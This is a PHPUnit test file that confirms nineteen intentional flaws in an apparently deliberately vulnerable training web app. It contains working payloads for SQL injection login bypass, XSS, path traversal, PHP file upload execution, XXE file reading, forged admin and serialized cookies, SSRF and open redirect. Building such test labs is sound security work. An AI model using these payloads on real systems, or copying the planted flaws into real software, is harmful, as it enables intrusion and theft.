<?php
declare(strict_types=1);

namespace CompanyHub\Tests;

use GuzzleHttp\Cookie\CookieJar;
use GuzzleHttp\Cookie\SetCookie;
use GuzzleHttp\RequestOptions;

/**
 * Smoke tests proving each catalogued vulnerability (V1–V19) is live and exploitable.
 * These run against the same containers as the controller tests but exercise the
 * unsafe paths intentionally.
 */
class VulnerabilitiesTest extends TestCase
{
    /** V1: SQL Injection — login bypass via raw string concat. */
    public function testV1_SqlInjectionLoginBypass(): void
    {
        $jar = new CookieJar();
        $r = $this->client($jar)->post('/login', [
            RequestOptions::FORM_PARAMS => [
                'email'    => "' OR 1=1-- ",
                'password' => 'anything',
                'next'     => '/dashboard',
            ],
        ]);
        $this->assertResponseStatus(302, $r);
        $this->assertSame('/dashboard', $this->locationOf($r));

        $follow = $this->client($jar)->get('/dashboard');
        $this->assertResponseStatus(200, $follow);
        $this->assertStringContainsString('Welcome back', $this->bodyOf($follow));
    }

    /** V2: Stored XSS — note body is rendered raw. */
    public function testV2_StoredXssInNoteBody(): void
    {
        $jar = $this->loginAs();
        $payload = '<script id="xss-marker">window.x=1</script>';
        $r = $this->client($jar)->post('/notes', [
            RequestOptions::FORM_PARAMS => ['title' => 'XSS demo', 'body' => $payload, 'is_public' => '1'],
        ]);
        $this->assertResponseStatus(302, $r);
        $id = (int) self::pdo()->query("SELECT id FROM notes WHERE title='XSS demo' ORDER BY id DESC LIMIT 1")->fetchColumn();

        $show = $this->client($jar)->get('/notes/' . $id);
        $this->assertStringContainsString($payload, $this->bodyOf($show));
    }

    /** V3: Reflected XSS — `q` echoed verbatim into the search heading. */
    public function testV3_ReflectedXssInDirectorySearch(): void
    {
        $jar = $this->loginAs();
        $payload = '<script id="reflected-xss">1</script>';
        $r = $this->client($jar)->get('/directory/search?q=' . urlencode($payload));
        $this->assertResponseStatus(200, $r);
        $this->assertStringContainsString($payload, $this->bodyOf($r));
    }

    /** V4: DOM XSS — notification.js sinks location.hash into innerHTML. */
    public function testV4_DomXssSinkInNotificationJs(): void
    {
        $r = $this->client()->get('/assets/js/notification.js');
        $this->assertResponseStatus(200, $r);
        $body = $this->bodyOf($r);
        $this->assertStringContainsString('innerHTML', $body);
        $this->assertStringContainsString('location.hash', $body);
    }

    /** V5: CSRF — state-changing POST succeeds with no token, no Origin / no Referer. */
    public function testV5_CsrfTokenIsNotEnforced(): void
    {
        $jar = $this->loginAs();
        $countBefore = (int) self::pdo()->query("SELECT COUNT(*) FROM notes")->fetchColumn();

        $r = $this->client($jar)->post('/notes', [
            RequestOptions::FORM_PARAMS => ['title' => 'CSRF', 'body' => 'no token', 'is_public' => '0'],
            // Deliberately no Origin / Referer headers — request still succeeds.
            RequestOptions::HEADERS     => ['Origin' => '', 'Referer' => ''],
        ]);
        $this->assertResponseStatus(302, $r);
        $countAfter = (int) self::pdo()->query("SELECT COUNT(*) FROM notes")->fetchColumn();
        $this->assertSame($countBefore + 1, $countAfter);
    }

    /** V6: IDOR — Alice can read Admin's private note. */
    public function testV6_IdorOnNotes(): void
    {
        $adminId = (int) self::pdo()->query("SELECT id FROM users WHERE email='admin@companyhub.local'")->fetchColumn();
        self::pdo()->exec("INSERT INTO notes (user_id, title, body, is_public) VALUES ($adminId, 'Private admin', 'top secret stuff', 0)");
        $id = (int) self::pdo()->lastInsertId();

        $jar = $this->loginAs();
        $r = $this->client($jar)->get('/notes/' . $id);
        $this->assertResponseStatus(200, $r);
        $this->assertStringContainsString('top secret stuff', $this->bodyOf($r));
    }

    /** V7: Vertical priv esc — flipping the `role` cookie grants admin access. */
    public function testV7_AdminRoleCookieIsTrusted(): void
    {
        $jar = $this->loginAs();
        // Forge the role cookie client-side; backend trusts it without DB lookup.
        $jar->setCookie(SetCookie::fromString('role=admin; Path=/; Domain=web'));

        $r = $this->client($jar)->get('/admin');
        $this->assertResponseStatus(200, $r);
        $this->assertStringContainsString('Administration · Overview', $this->bodyOf($r));
    }

    /** V8: Path traversal — `?file=` escapes the uploads directory. */
    public function testV8_PathTraversalOnFileDownload(): void
    {
        $jar = $this->loginAs();
        // public/uploads is 5 dirs deep from /, so ../../../../../etc/hostname reaches it.
        $r = $this->client($jar)->get('/files/download?file=' . urlencode('../../../../../etc/hostname'));
        $this->assertResponseStatus(200, $r);
        $this->assertNotSame('', trim($this->bodyOf($r)));
    }

    /** V9: Insecure file upload — a .php file lands in webroot and is executed. */
    public function testV9_PhpUploadExecutesAsCode(): void
    {
        $jar = $this->loginAs();
        $name = 'pwn-' . bin2hex(random_bytes(3)) . '.php';
        $php  = "<?php echo 'pwned-' . (1+1);";

        $r = $this->client($jar)->post('/files', [
            RequestOptions::MULTIPART => [[
                'name'     => 'file',
                'filename' => $name,
                'contents' => $php,
                'headers'  => ['Content-Type' => 'image/png'], // claimed mime is trusted
            ]],
        ]);
        $this->assertResponseStatus(302, $r);

        $exec = $this->client()->get('/uploads/' . $name);
        $this->assertResponseStatus(200, $exec);
        $this->assertStringContainsString('pwned-2', $this->bodyOf($exec));

        @unlink('/var/www/html/public/uploads/' . $name);
    }

    /** V10: SSRF — preview endpoint fetches arbitrary internal URLs. */
    public function testV10_SsrfFromLinkPreview(): void
    {
        $jar = $this->loginAs();
        // The "web" hostname only resolves inside the docker network — proving the
        // server made the request rather than the browser.
        $r = $this->client($jar)->get('/links/preview?url=' . urlencode('http://web/login'));
        $this->assertResponseStatus(200, $r);
        $this->assertStringContainsString('Sign in', $this->bodyOf($r));
    }

    /** V11: Open redirect — `next` is honored even for off-host URLs. */
    public function testV11_OpenRedirectOnLoginNext(): void
    {
        $jar = new CookieJar();
        $r = $this->client($jar)->post('/login', [
            RequestOptions::FORM_PARAMS => [
                'email'    => 'alice@companyhub.local',
                'password' => 'password1',
                'next'     => 'https://evil.example/landing',
            ],
        ]);
        $this->assertResponseStatus(302, $r);
        $this->assertSame('https://evil.example/landing', $this->locationOf($r));
    }

    /** V12: Security misconfig — phpinfo() leaked, no security headers. */
    public function testV12_DebugEndpointAndMissingHeaders(): void
    {
        $r = $this->client()->get('/debug.php');
        $this->assertResponseStatus(200, $r);
        $this->assertStringContainsString('PHP Version', $this->bodyOf($r));

        $home = $this->client()->get('/login');
        $this->assertSame('', $home->getHeaderLine('Content-Security-Policy'));
        $this->assertSame('', $home->getHeaderLine('X-Frame-Options'));
        $this->assertSame('', $home->getHeaderLine('Strict-Transport-Security'));
    }

    /** V13: Crypto — passwords are MD5; remember_me cookie is base64(user_id). */
    public function testV13_WeakCryptography(): void
    {
        $jar = $this->loginAs();
        $remember = $jar->getCookieByName('remember_me');
        $this->assertNotNull($remember);
        $aliceId = (int) self::pdo()->query("SELECT id FROM users WHERE email='alice@companyhub.local'")->fetchColumn();
        $this->assertSame((string) $aliceId, base64_decode(rawurldecode($remember->getValue())));

        $hash = (string) self::pdo()->query("SELECT password_md5 FROM users WHERE email='alice@companyhub.local'")->fetchColumn();
        $this->assertMatchesRegularExpression('/^[a-f0-9]{32}$/', $hash);
        $this->assertSame(md5('password1'), $hash);
    }

    /** V14: Auth failures — password reset tokens are short and brute-forceable. */
    public function testV14_WeakPasswordResetTokens(): void
    {
        $r = $this->client()->post('/forgot', [
            RequestOptions::FORM_PARAMS => ['email' => 'alice@companyhub.local'],
        ]);
        $this->assertResponseStatus(302, $r);
        $token = (string) self::pdo()->query("SELECT token FROM password_resets ORDER BY id DESC LIMIT 1")->fetchColumn();
        $this->assertSame(6, strlen($token), 'Reset token should be 6 characters');
        $this->assertMatchesRegularExpression('/^[a-z0-9]{6}$/', $token);
    }

    /** V15: Insecure deserialization — the preferences cookie is unserialize()d. */
    public function testV15_PreferencesCookieIsUnserialized(): void
    {
        $jar = $this->loginAs();
        $forged = base64_encode(serialize(['theme' => 'pwned-via-unserialize', 'compact_mode' => true]));
        $jar->setCookie(SetCookie::fromString('preferences=' . $forged . '; Path=/; Domain=web'));

        $r = $this->client($jar)->get('/profile');
        $this->assertResponseStatus(200, $r);
        $this->assertStringContainsString('theme-pwned-via-unserialize', $this->bodyOf($r));
    }

    /** V16: Vulnerable components — composer.json pins a known-vulnerable phpmailer. */
    public function testV16_VulnerableComponentPinned(): void
    {
        $composer = json_decode((string) file_get_contents(dirname(__DIR__) . '/composer.json'), true);
        $this->assertSame('6.0.6', $composer['require']['phpmailer/phpmailer'] ?? null,
            'phpmailer should be pinned to a vulnerable version (CVE-2018-19296)');
    }

    /** V17: XXE — external entity expansion in the contact import. */
    public function testV17_XxeExpandsExternalEntities(): void
    {
        $jar = $this->loginAs();
        $email = 'xxe-' . bin2hex(random_bytes(3)) . '@companyhub.local';
        $xml = '<?xml version="1.0"?>'
             . '<!DOCTYPE c [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>'
             . "<contacts><contact><name>XXE Probe</name><email>{$email}</email><note>&xxe;</note></contact></contacts>";

        $r = $this->client($jar)->post('/import', [
            RequestOptions::MULTIPART => [[
                'name'     => 'xml',
                'filename' => 'xxe.xml',
                'contents' => $xml,
                'headers'  => ['Content-Type' => 'application/xml'],
            ]],
        ]);
        $this->assertResponseStatus(200, $r);
        $body = $this->bodyOf($r);
        // The container hostname is rendered into the imported "note" cell verbatim.
        $hostname = trim((string) @file_get_contents('/etc/hostname'));
        if ($hostname !== '') {
            $this->assertStringContainsString($hostname, $body, 'Expected /etc/hostname contents in expanded entity');
        }
    }

    /** V18: Logging failures — no audit table or log infrastructure exists. */
    public function testV18_NoAuditLogInfrastructure(): void
    {
        $tables = self::pdo()->query("SHOW TABLES LIKE '%log%'")->fetchAll();
        $this->assertCount(0, $tables, 'No audit/log tables should exist');

        $audit = self::pdo()->query("SHOW TABLES LIKE '%audit%'")->fetchAll();
        $this->assertCount(0, $audit, 'No audit table should exist');
    }

    /** V19: Clickjacking — admin pages can be framed (no X-Frame-Options / CSP frame-ancestors). */
    public function testV19_AdminPagesAreFrameable(): void
    {
        $jar = $this->loginAsAdmin();
        $r = $this->client($jar)->get('/admin');
        $this->assertResponseStatus(200, $r);
        $this->assertSame('', $r->getHeaderLine('X-Frame-Options'));
        $this->assertStringNotContainsString('frame-ancestors', $r->getHeaderLine('Content-Security-Policy'));
    }
}
